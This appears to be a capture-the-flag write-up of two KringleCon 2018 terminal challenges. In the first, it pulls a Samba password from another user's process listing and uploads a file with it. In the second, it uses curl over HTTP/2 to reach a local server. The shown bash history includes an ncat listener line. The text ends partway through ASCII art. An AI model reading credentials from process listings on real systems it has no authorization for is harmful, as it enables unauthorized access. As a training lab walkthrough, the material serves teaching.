<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkO0</span><span style="color: rgb(196, 160, 0);">XW</span>MMMM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(196, 160, 0);">NXXXXXXXNW</span>MMMMM<span style="color: rgb(196, 160, 0);">MN</span><span style="color: rgb(204, 0, 0);">Ko,,,,,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXW</span>MMM<span style="color: rgb(211, 215, 207);">MM</span>MMM<span style="color: rgb(196, 160, 0);">NXXXXXXW</span>M<span style="color: rgb(211, 215, 207);">MMMMM</span>MM<span style="color: rgb(196, 160, 0);">NX</span><span style="color: rgb(204, 0, 0);">0c,,,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkO</span><span style="color: rgb(196, 160, 0);">KXXN</span>MM<span style="color: rgb(211, 215, 207);">MMMMMM</span>M<span style="color: rgb(196, 160, 0);">WXXXXXN</span>MM<span style="color: rgb(211, 215, 207);">MMMMM</span>MM<span style="color: rgb(196, 160, 0);">WXXX</span><span style="color: rgb(204, 0, 0);">x,,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkO</span><span style="color: rgb(196, 160, 0);">XXXXN</span>MM<span style="color: rgb(211, 215, 207);">MMMMMM</span>M<span style="color: rgb(196, 160, 0);">MXXXXXN</span>M<span style="color: rgb(211, 215, 207);">MMMMMMMM</span><span style="color: rgb(196, 160, 0);">WXXXX</span><span style="color: rgb(204, 0, 0);">k,,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">KXXXXNM</span>M<span style="color: rgb(211, 215, 207);">MMXl:d</span>W<span style="color: rgb(196, 160, 0);">WXXXXXN</span>MX<span style="color: rgb(211, 215, 207);">l:dWM</span>MM<span style="color: rgb(196, 160, 0);">WXXXXX</span><span style="color: rgb(204, 0, 0);">d,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXXXXXN</span>MMM<span style="color: rgb(211, 215, 207);">o   </span><span style="color: rgb(196, 160, 0);">KNXXXXXXN</span>o<span style="color: rgb(211, 215, 207);">   KM</span>M<span style="color: rgb(196, 160, 0);">MNXXXXXX</span><span style="color: rgb(204, 0, 0);">;,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">KXXXXXXXNW</span>MM0k<span style="color: rgb(196, 160, 0);">KNXXXXXXXXN0</span>kXM<span style="color: rgb(196, 160, 0);">MWNXXXXXXX</span><span style="color: rgb(204, 0, 0);">o,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXNNNNXXXX0xxKXXXXNNNNXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">x,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXX</span>' <span style="color: rgb(211, 215, 207);">  </span> <span style="color: rgb(196, 160, 0);">oXXXXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">d,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXX</span>.<span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(196, 160, 0);">cXXXXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">c,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkO</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXXdllkXXXXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">k,,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span style="color: rgb(78, 154, 6);">k</span><span style="color: rgb(204, 0, 0);">l,,,,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><span style="color: rgb(78, 154, 6);">Okkk</span><span style="color: rgb(204, 0, 0);">l;,,,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkO</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXK</span><span style="color: rgb(78, 154, 6);">kkkkkkk</span><span style="color: rgb(204, 0, 0);">o;,,,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkk0</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXXXXXXXXXXXXXXXXXK</span><span style="color: rgb(78, 154, 6);">Okkkkkkkkkk</span><span style="color: rgb(204, 0, 0);">d:,,,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkO</span><span style="color: rgb(196, 160, 0);">KXXXXXXXXXXXXXXXXXXXXXX</span><span style="color: rgb(78, 154, 6);">KOkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">d</span><span style="color: rgb(204, 0, 0);">:,,,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkO0</span><span style="color: rgb(196, 160, 0);">KXXXXXXXXXXXXXXK</span><span style="color: rgb(78, 154, 6);">0Okkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">d</span><span style="color: rgb(204, 0, 0);">:,,,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000OOkkkkkkkkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">x</span><span style="color: rgb(204, 0, 0);">c,,,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk</span><span style="color: rgb(196, 160, 0);">x</span><span style="color: rgb(204, 0, 0);">l,,,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx</span><span style="color: rgb(204, 0, 0);">l,,</span>
<span style="color: rgb(78, 154, 6);">kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx</span><span style="color: rgb(204, 0, 0);">;</span>

Thank you Madam or Sir for the help that you bring!
I was wondering how I might rescue my day.
Finished mucking out stalls of those pulling the sleigh,
My report is now due or my KRINGLE's in a sling!

There's a samba share here on this terminal screen.
What I normally do is to upload the file,
With our network credentials (we've shared for a while).
When I try to remember, my memory's clean!

Be it last night's nog bender or just lack of rest,
For the life of me I can't send in my report.
Could there be buried hints or some way to contort,
Gaining access - oh please now do give it your best!

-Wunorse Openslae


Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/
elf@776172646f67:~$        </pre>

        <p>Running the command <kbd>ps a</kbd> outputs the following processes. The processes of interest are in red</p>

        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   <span style="color: rgb(255, 64, 64);">10 pts/0    S      0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload</span>
   11 pts/0    S      0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
   13 pts/0    S      0:00 /usr/bin/python /home/manager/report-check.py
   <span style="color: rgb(255, 64, 64);">15 pts/0    S      0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload</span>
   17 pts/0    S      0:00 sudo -u elf /bin/bash
   19 pts/0    S      0:00 /bin/bash
   34 pts/0    S      0:00 sleep 60
   37 pts/0    R+     0:00 ps a
   38 pts/0    S+     0:00 less</pre>

        <p>It's possible that when you try this challenge, the long command lines will be cut off by the screen. If so, simply pipe the results into "less" using <kbd>ps a | less</kbd>.</p>
        <p>Some funny options seen are:</p>
        <ul>
          <li><kbd>--ignore-sw-holiday-special</kbd> - Man, we really don't like the Star Wars special. :)</li>
          <li><kbd>42</kbd> - The answer to life, the universe and everything. Thanks Douglas Adams!</li>
          <li><kbd>--do-not-run-as-tyler</kbd> - Ok, what did Tyler do? ಠ_ಠ</li>
        </ul>
        <p>Parsing through the results we can see <kbd>directreindeerflatterystable</kbd> which looks a lot like a <a href="https://en.wikipedia.org/wiki/Diceware">diceware password</a>. We also see the '-U' option suggesting the username is <kbd>report-upload</kbd>. Armed with this info we attempt to upload our file.</p>

        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ smbclient //localhost/report-upload -U report-upload -c "put report.txt"

WARNING: The "syslog" option is deprecated
Enter report-upload's password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
putting file report.txt as \report.txt (500.9 kb/s) (average 501.0 kb/s)
elf@776172646f67:~$
<span style="color: rgb(211, 215, 207);">                                                                               </span>
<span style="color: rgb(211, 215, 207);">                               .;;;;;;;;;;;;;;;'                               </span>
<span style="color: rgb(211, 215, 207);">                             ,NWOkkkkkkkkkkkkkkNN;                             </span>
<span style="color: rgb(211, 215, 207);">                           ..KM; Stall Mucking </span>,<span style="color: rgb(211, 215, 207);">M</span>N<span style="color: rgb(211, 215, 207);">..                           </span>
<span style="color: rgb(211, 215, 207);">                         OMNXNMd.             .oMWXXM0.                        </span>
<span style="color: rgb(211, 215, 207);">                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc            </span>    <span style="color: rgb(211, 215, 207);">        </span>
<span style="color: rgb(211, 215, 207);">                        :MO                         xMl            </span> <span style="color: rgb(78, 154, 6);">'</span>.  <span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl            </span> <span style="color: rgb(78, 154, 6);">:l:</span>.  <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">.cc::::::::;;;;;;;;;;;,o</span><span style="color: rgb(211, 215, 207);">MO  .0NNNNNNNNNNNNNNNNN0.  xM</span>d,<span style="color: rgb(78, 154, 6);">,,,,,,,,,,,,clll:.</span>   <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">'kkkkxxxxxddddddooooooox</span><span style="color: rgb(211, 215, 207);">MO   ..'''''''''''.        xM</span>k<span style="color: rgb(78, 154, 6);">cccccccllllllllllooc.</span>  <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">'kkkkxxxxxddddddooooooox</span><span style="color: rgb(211, 215, 207);">MO  .MMMMMMMMMMMMMM,       xM</span>k<span style="color: rgb(78, 154, 6);">cccccccllllllllllooool</span> <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">'kkkkxxxxxddddddooooooox</span><span style="color: rgb(211, 215, 207);">MO   '::::::::::::,        xM</span>k<span style="color: rgb(78, 154, 6);">cccccccllllllllllool,</span>  <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> </span><span style="color: rgb(204, 0, 0);">.ooooollllllccccccccc::d</span><span style="color: rgb(211, 215, 207);">MO                         xM</span>x<span style="color: rgb(78, 154, 6);">;;;;;::::::::lllll'</span>   <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);">                        :MO  .ONNNNNNNNXk           xMl            </span> <span style="color: rgb(78, 154, 6);">:lc'</span>  <span style="color: rgb(211, 215, 207);">     </span>
<span style="color: rgb(211, 215, 207);">                        :MO   dOOOOOOOOOo           xMl            </span> <span style="color: rgb(78, 154, 6);">;.</span>  <span style="color: rgb(211, 215, 207);">       </span>
<span style="color: rgb(211, 215, 207);">                        :MO   'cccccccccccccc:'     xMl            </span> <span style="color: rgb(211, 215, 207);"> </span>  <span style="color: rgb(211, 215, 207);">        </span>
<span style="color: rgb(211, 215, 207);">                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        </span>
<span style="color: rgb(211, 215, 207);">                        :MO    ...............      xMl                        </span>
<span style="color: rgb(211, 215, 207);">                        .NWxdddddddddddddddddddddddd</span>N<span style="color: rgb(211, 215, 207);">W'                        </span>
<span style="color: rgb(211, 215, 207);">                          ;ccccccccccccccccccccccccc;                          </span>
<span style="color: rgb(211, 215, 207);">                                                                               </span>



You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae</pre>

      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termHTTP2"></a>CURLing Master
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntHolly">Holly Evergreen Hints</a>
            <a class="dropdown-item" href="#npcHolly">Holly Evergreen</a>
            <a class="dropdown-item" href="#obj5">Objective 5</a>
          </div>
        </div>

        <div id="divHTTP2" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT1odHRwMiI+PC9pZnJhbWU+PHA+PGEgaHJlZj0iIyEiIGNsYXNzPSJidG4gYnRuLWluZm8iICBvbm1vdXNldXA9IiQoJyNkaXZIVFRQMicpLmh0bWwoYXRvYignUEdFZ2FISmxaajBpSXlFaUlHTnNZWE56UFNKaWRHNGdZblJ1TFdsdVptOGlQa05zYVdOcklHaGxjbVVnZEc4Z1BHSStiM0JsYmp3dllqNGdRMVZTVEdsdVp5Qk5ZWE4wWlhJZ1ZHVnliV2x1WVd3OEwyRSsnKSkiPkNsaWNrIGhlcmUgdG8gPGI+Y2xvc2U8L2I+IENVUkxpbmcgTWFzdGVyIFRlcm1pbmFsPC9hPjwvcD4="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> CURLing Master Terminal</a>
        </div>

        <hr span="my-4">
        <p>As we open this terminal we are greeted with a curling stone and a rhyme.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(204, 0, 0);">                  .....................................                        </span>
<span style="color: rgb(204, 0, 0);">                 ...',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'....                      </span>
<span style="color: rgb(204, 0, 0);">                 ...,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'...                     </span>
<span style="color: rgb(204, 0, 0);">                  ......'''''''''''''''''''''''',,,,,,,'...                    </span>
<span style="color: rgb(204, 0, 0);">                     ............................',,,,,,,...                   </span>
<span style="color: rgb(204, 0, 0);">                                                ...,,,,,,'...                  </span>
<span style="color: rgb(204, 0, 0);">                                                 ..',,,,,,'..                  </span>
<span style="color: rgb(204, 0, 0);">                                                 ...,,,,,,,...                 </span>
<span style="color: rgb(204, 0, 0);">                                                 ...,,,,,,,...                 </span>
<span style="color: rgb(204, 0, 0);">            ........................................,,,,,,,'......             </span>
<span style="color: rgb(204, 0, 0);">         .....''''''''''''''''''''''''''''''''''''',,,,,,,,,,'''.....          </span>
<span style="color: rgb(204, 0, 0);">        ...............................................................        </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">        ...............................................................        </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">      .:llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.       </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll;      </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">    'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     </span>
<span style="color: rgb(78, 154, 6);">   .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk:    </span>
<span style="color: rgb(78, 154, 6);">   o0000000000000000000000000000000000000000000000000000000000000000000000O    </span>
<span style="color: rgb(78, 154, 6);">   O00000000000000000000000000000000000000000000000000000000000000000000000'   </span>
<span style="color: rgb(78, 154, 6);">   O00000000000000000000000000000000000000000000000000000000000000000000000'   </span>
<span style="color: rgb(78, 154, 6);">   d0000000000000000000000000000000000000000000000000000000000000000000000O.   </span>
<span style="color: rgb(78, 154, 6);">   'OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOc    </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">    ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">     ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:      </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">      .clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll'       </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">        'clllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,         </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">          .,clllllllllllllllllllllllllllllllllllllllllllllllllllll;.           </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">              .';:cllllllllllllllllllllllllllllllllllllllllcc;,..              </span>
<span style="color: rgb(85, 87, 83); font-weight: bold;">                                                                               </span>


I am Holly Evergreen, and now you won't believe:
Once again the striper stopped; I think I might just leave!
Bushy set it up to start upon a website call.
Darned if I can CURL it on - my Linux skills apall.

Could you be our CURLing master - fixing up this mess?
If you are, there's one concern you surely must address.
Something's off about the conf that Bushy put in place.
Can you overcome this snag and save us all some face?

  Complete this challenge by submitting the right HTTP
  request to the server at http://localhost:8080/ to
  get the candy striper started again. You may view
  the contents of the nginx.conf file in
  /etc/nginx/, if helpful.
elf@776172646f67:~$</pre>
        <p>If we dig around a little we see there's a .bash_history file.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ ls -al
total 24
drwxr-xr-x 1 elf  elf  4096 Dec 14 16:15 .
drwxr-xr-x 1 root root 4096 Dec 14 16:14 ..
-rw-r--r-- 1 elf  elf   464 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf  3543 Dec 14 16:15 .bashrc
-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile
elf@776172646f67:~$ cat .bash_history
netstat -ant
ncat --broker -nlvp 9090
echo "\302\257\_(\343\203\204)_/\302\257" >> /tmp/shruggins
cat /tmp/shruggins
curl --http2-prior-knowledge http://localhost:8080/index.php
telnet towel.blinkenlights.nl
fortune | cowsay | lolcat
ps -aux
sl
figlet I am your father
echo 'goHangasaLAmIimalaSAgnaHoG' | rev
aptitude moo
aptitude -v moo
aptitude -vv moo
aptitude -vvv moo
aptitude -vvvv moo
aptitude -vvvvv moo
aptitude -vvvvvv moo
yes Giddyup
factor 512
aafire

elf@776172646f67:~$</pre>
        <p>Somethign tells me this elf gets bored easily.</p>
        <p><kbd>curl --http2-prior-knowledge http://localhost:8080/index.php</kbd> looks like it may come in handy later. <kbd>telnet towel.blinkenlights.nl</kbd> is star wars in ascii. <kbd>goHangasaLAmIimalaSAgnaHoG</kbd> is a palindrome. <kbd>netstat -ant</kbd> when executed, does show that port 8080 is listening.
        <p>Taking a look at the nginx.conf file we see the following (interesting bits in red).</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ cat /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {

        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;
        # server_tokens off;

        # server_names_hash_bucket_size 64;
        # server_name_in_redirect off;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        server {
<span style="color: rgb(204, 0, 0);">        # love using the new stuff! -Bushy</span>
                listen                  8080 <span style="color: rgb(204, 0, 0);">http2</span>;
                # server_name           localhost 127.0.0.1;
                root /var/www/html;

                location ~ [^/]\.php(/|$) {
                    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
                    if (!-f $document_root$fastcgi_script_name) {
                        return 404;
                    }

                    # Mitigate https://httpoxy.org/ vulnerabilities
                    fastcgi_param HTTP_PROXY "";

                    # fastcgi_pass 127.0.0.1:9000;
                    fastcgi_pass unix:/var/run/php/php-fpm.sock;
                    fastcgi_index index.php;

                    # include the fastcgi_param setting
                    include fastcgi_params;

                    # SCRIPT_FILENAME parameter is used for PHP FPM determining
                    #  the script name. If it is not set in fastcgi_params file,
                    # i.e. /etc/nginx/fastcgi_params or in the parent contexts,
                    # please comment off following line:
                    # fastcgi_param  SCRIPT_FILENAME   $document_root$fastcgi_script_name;
                }

                }

        ##
        # Logging Settings
        ##

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        ##
        # Gzip Settings
        ##

        gzip on;
        gzip_disable "msie6";

        # gzip_vary on;
        # gzip_proxied any;
        # gzip_comp_level 6;
        # gzip_buffers 16 8k;
        # gzip_http_version 1.1;
        # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        ##
        # Virtual Host Configs
        ##

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;

}</pre>
        <p>It looks like Bushy has enabled the application in HTTP2 only. <a href="#hntHolly">Holly</a> gives us one <a href="https://developers.google.com/web/fundamentals/performance/http2/">hint</a>. If, per the instructions on login, we attempt to curl to the local server we get garbage back.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ curl -v http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
>
* Curl_http_done: called premature == 0
* Connection #0 to host localhost left intact
   ����</pre>
        <p>Since we know that the challenge requires the use of curl and http2 we should see what we can find out about these two. Fortunately, one of the Kringle Con talks is given by Chris Elgee on the topic <a href="https://www.youtube.com/watch?v=PC6-mn9g9Cs">HTTP/2: Because 1 Is the Loneliest Number</a>. In this talk Chris introduces the curl option <kbd>--http2</kbd> that we can use to talk HTTP2 to the web server. Doing to results in the following:</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ curl -v --http2 http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
> Connection: Upgrade, HTTP2-Settings
> Upgrade: h2c
> HTTP2-Settings: AAMAAABkAARAAAAA
>
* Curl_http_done: called premature == 0
* Connection #0 to host localhost left intact
   ����</pre>
        <p>Uh... Wait. that didn't work. It looks like it's still using HTTP/1.1. Perhaps there's something else we can do. Doing some research there is another option we can use <kbd>--http2-prior-knowledge</kbd> that bascially use HTTP/2 immediately instead of going through a protocol upgrade path. We saw this being used on the command line in the bash history of this terminal.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ curl -v -s --http2-prior-knowledge http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55b6ee40bdc0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
>
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
< HTTP/2 200
< server: nginx/1.10.3
< date: Thu, 20 Dec 2018 15:52:06 GMT
< content-type: text/html; charset=UTF-8
<
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;p&gt;To turn the machine on, simply POST to this URL with parameter "status=on"


 &lt;/body&gt;
&lt;/html&gt;
* Curl_http_done: called premature == 0
* Connection #0 to host localhost left intact</pre>
        <p>It looks like we're making some progress. We just need to add a <kbd>status=on</kbd> POST parameter.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ curl -v --http2-prior-knowledge -d "status=on" http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
* Using Stream ID: 1 (easy handle 0x55840d524dc0)
&gt; POST / HTTP/1.1
&gt; Host: localhost:8080
&gt; User-Agent: curl/7.52.1
&gt; Accept: */*
&gt; Content-Length: 9
&gt; Content-Type: application/x-www-form-urlencoded
&gt;
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
&lt; HTTP/2 200
&lt; server: nginx/1.10.3
&lt; date: Thu, 20 Dec 2018 15:53:35 GMT
&lt; content-type: text/html; charset=UTF-8
&lt;
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On'er&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
 &lt;p&gt;To turn the machine on, simply POST to this URL with parameter "status=on"

 <span style="color: rgb(211, 215, 207);">                                                                               </span>
<span style="color: rgb(211, 215, 207);">                                                               </span> <span style="color: rgb(196, 160, 0);">okkd</span>, <span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">                                                              </span> <span style="color: rgb(196, 160, 0);">OXXXXX</span>,<span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">                                                             </span> <span style="color: rgb(196, 160, 0);">oXXXXXXo</span><span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">                                                             </span>;<span style="color: rgb(196, 160, 0);">XXXXXXX</span>;<span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">                                                            </span>;<span style="color: rgb(196, 160, 0);">KXXXXXXx</span> <span style="color: rgb(211, 215, 207);">         </span>
<span style="color: rgb(211, 215, 207);">                                                          </span> <span style="color: rgb(196, 160, 0);">oXXXXXXXO</span> <span style="color: rgb(211, 215, 207);">          </span>
<span style="color: rgb(211, 215, 207);">                                                       </span> .<span style="color: rgb(196, 160, 0);">lKXXXXXXX0</span>.<span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">  ''''</span>''<span style="color: rgb(204, 0, 0);">       </span><span style="color: rgb(211, 215, 207);">.''''</span>'<span style="color: rgb(211, 215, 207);">'</span><span style="color: rgb(204, 0, 0);">       </span><span style="color: rgb(211, 215, 207);">.''''''</span><span style="color: rgb(204, 0, 0);">       </span><span style="color: rgb(78, 154, 6);">.:::;</span>   '<span style="color: rgb(196, 160, 0);">:okKXXXXXXXX</span><span style="color: rgb(204, 0, 0);">0Ox</span><span style="color: rgb(196, 160, 0);">cooddool</span>, <span style="color: rgb(211, 215, 207);">  </span>
